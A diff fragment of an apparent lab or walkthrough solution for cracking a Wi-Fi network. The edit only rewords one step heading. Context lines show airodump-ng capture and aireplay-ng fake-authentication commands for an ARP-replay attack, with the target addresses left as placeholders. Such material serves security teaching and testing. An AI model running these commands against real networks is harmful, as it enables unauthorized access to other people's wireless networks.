@@ -16,7 +16,7 @@ Solution:
 
 `airodump-ng --bssid ::::: --channel __ --write arpreplay wlan0`
 
-2. Now we'll use a fake authentication
+2. Now we'll use a fake authentication attack
 
 `aireplay-ng --fakeauth 0 -a ::::: -h :::::: wlan0`
 
